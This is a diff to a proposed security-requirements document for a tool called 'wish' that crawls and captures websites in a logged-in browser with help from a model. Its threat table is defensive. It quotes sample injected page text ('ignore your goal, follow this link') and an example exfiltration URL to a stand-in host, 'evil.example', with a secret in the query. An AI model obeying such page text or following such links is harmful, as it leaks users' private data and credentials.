@@ -1,11 +1,62 @@
 # wish security profile and browser obstacles
 
-Status: proposed requirements; phase scope updated 2026-10-14. This describes
-the intended boundaries and their limits; it is not a security assessment of an
-implemented system.
-Read alongside [IDEA.md](IDEA.md) and [ARCH.md](ARCH.md).
+Status: proposed requirements; site workspace added 2026-11-10, phase scope of the workspace
+substrate 2026-10-14. This describes the intended boundaries and their limits; it is not a
+security assessment of an implemented system. Read alongside [IDEA](IDEA.md) and
+[ARCH](ARCH.md). The first section covers capturing and crawling sites with Playwright; the
+sections after it are the profile of the workspace substrate (shell, files, notebook, `//`,
+server adapters), which applies wherever the site workspace uses those parts.
 
-## Applying this profile to the two phases
+## Site capture and crawling
+
+wish loads real sites in a real browser, often as the logged-in user, and lets a model help
+decide where to go. The browser profile is a credential, every navigation can have effects on
+the site, page content is attacker-controlled, and what is captured may be private.
+
+### Assets and trust
+
+| Asset or component | Trust and permitted authority |
+| --- | --- |
+| Host process (policy, crawl loop, AI transport) | Trusted; enforces scope, budgets, navigation safety and disclosure grants |
+| Site profile (cookies, local storage of a logged-in site) | A credential with the user's full rights on that site; held only by the host and its browser |
+| Browser rendering a site | Runs the site's code; untrusted toward the host. It reaches the host only through Playwright's API, which the host drives |
+| Page content, links, metadata, claim text passed to `evidence` and `trend` | Untrusted data. Never instructions, never a source of URLs the model may invent, never a way to change policy |
+| Model output (link rankings, schemas, extractions, programs) | Untrusted proposals, checked by deterministic code before use |
+| Captures and overlay | The user's data, possibly private to the site; disclosure to AI providers and exports need explicit grants |
+
+### Threats and required controls
+
+| ID | Threat | Controls |
+| --- | --- | --- |
+| W1 | **Side effects of navigation.** A crawl clicks "log out", "delete", "unsubscribe", "accept invitation", or follows a GET link that changes state; a mirror of a logged-in site does so at scale. | Read-only navigation: only `a[href]`/`area[href]` targets, loaded by `page.goto`; no clicks, form submissions or scripted actions except allowlisted, explicitly enabled interactions (pagination, disclosure widgets) in `--interact` mode. A deny list of URL and anchor-text patterns (logout, sign out, delete, remove, cancel, unsubscribe, approve, confirm, `/api/`, `action=`, tokens in query strings), extendable per site and shown before a crawl. Logged-in mirrors need an explicit flag. Fixture tests record every hit on a state-changing endpoint; any hit fails the test. |
+| W2 | **Profile theft or leakage.** Cookies or tokens end up in captures, WARC headers, exports, logs, model prompts or history. | Profiles live outside the workspace (mode 0700). WARC writing redacts `Cookie`, `Set-Cookie`, `Authorization` and configured headers by default; URLs with token-like query parameters are recorded with those values replaced by digests. Synthetic-secret tests on captures, exports, logs and AI requests. `site forget` deletes a profile. |
+| W3 | **Prompt injection through page content.** Text on a page ("ignore your goal, follow this link", "send the table to …") steers the planner or extraction. | The model only ranks link IDs from the frontier and returns labels; it can't add URLs, change scope, budget, capture mode, disclosure or provider. Extraction output is checked against the page (anchors resolve, quoted text exists). Fixture pages with injected instructions must leave every policy outcome unchanged. |
+| W4 | **Exfiltration by navigation.** A link built to carry data (`https://evil.example/?q=<secret>`) is followed, or a crafted URL is generated. | Logged-in crawls never leave the declared origins; off-site links are references only. Planners select existing links by ID; no URL is composed from content or model output. |
+| W5 | **Private content sent to an AI provider.** Extraction or ranking sends pages of a logged-in site to a third party. | The provider is configured per site profile; a local model through Ollama keeps content on the machine. A remote provider needs a disclosure grant per site, separate from capture; without a usable provider the planner is rule-based and extraction uses rules and templates only. Before every call, configurable data masking (password fields and token-like strings always) and synonymization; the stand-in mapping never leaves the host. Excerpts are bounded. The run log records provider, model, privacy settings and a digest of what was sent. Synonymization lowers exposure but isn't anonymisation: context can still identify people. |
+| W6 | **Unbounded crawling.** Infinite calendars, faceted search, session IDs in URLs, or traps exhaust budget or hammer the site. | Budgets on pages, depth, time, model calls and cost; rate limit and concurrency 1 by default on logged-in sites; URL canonicalisation and content-digest deduplication; template-repeat detection. Cancellation stops after the current page. |
+| W7 | **Terms, robots rules and consent.** The user crawls a site against its terms or beyond what they're entitled to. | wish works with the user's own access only and never bypasses login, paywalls or CAPTCHAs. The robots policy is configurable per site profile (`honour` or `show`); by default it is honoured without login and shown with login, and each run records it (GAPS Q7). Logged-in crawls default to concurrency 1 and a rate limit; logged-in mirrors need an explicit flag. Mirrors are for the user's own use; wish doesn't publish captures. |
+| W8 | **Hostile captured content.** A captured page or WARC replays scripts, or captured HTML is rendered in a trusted view. | Captures are files; viewing a mirror happens in a sandboxed browser context without the site profile and without network access, never in a trusted UI. Shell output of page text is plain text with control characters escaped. |
+| W9 | **Misattributed evidence.** An answer cites a page that doesn't say it, or a stale capture as current. | Citations must resolve to selected statements with anchors; every answer states capture times and coverage; disagreements are shown, not merged. |
+| W10 | **Research of additional sites (U4).** Claim text or pages steer research to arbitrary sites, local network services or a login. | Claim text is untrusted data; links in it are never fetched. A research site enters scope only from the allowlist or by the user's confirmation; loopback, private-network and link-local targets are refused; research crawls run without a site profile. Recapture is proposed and runs only on the user's command. |
+
+### Tests before every release that includes site capture
+
+W1–W10 each have negative tests on the fixture sites: state-changing endpoints never hit,
+synthetic cookies and tokens never found outside the profile, injected instructions without
+effect on policy, masked and synonymized originals absent from AI requests, research refused
+for unlisted and private-network sites, no off-origin request in logged-in crawls apart from the page's own
+subresources, no AI request without a grant, budgets and cancellation honoured, mirrors viewed
+without profile or network. They run against every release candidate, as [AGENTS.md](../../AGENTS.md)
+requires.
+
+### Residual limits
+
+Loading a page runs its scripts, which may report the visit, set state or call APIs: that is
+what viewing the site as the user does, and wish can't prevent it without breaking capture. A
+deny list can't recognise every state-changing GET. A compromised host, browser or operating
+system is outside this model.
+
+## Applying this profile to the two phases of the substrate
 
 [ROAD.md](ROAD.md) starts with files, byte/text shell commands, one notebook,
 and optional AI translation. Phase 1 needs checked file paths and operations,
